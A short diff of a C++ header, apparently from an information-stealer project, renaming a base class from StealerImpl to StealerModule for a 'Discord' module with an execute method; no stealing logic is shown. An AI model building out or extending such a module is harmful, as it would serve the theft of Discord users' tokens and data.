@@ -11,11 +11,11 @@
 #include "json.hpp"
 #include <windows.h>
 
-#include "../../../StealerImpl.h"
+#include "../../../StealerModule.h"
 
 using json = nlohmann::json;
 
-class Discord : public StealerImpl {
+class Discord : public StealerModule {
 public:
     void execute(fs::path &root) override;
 private:
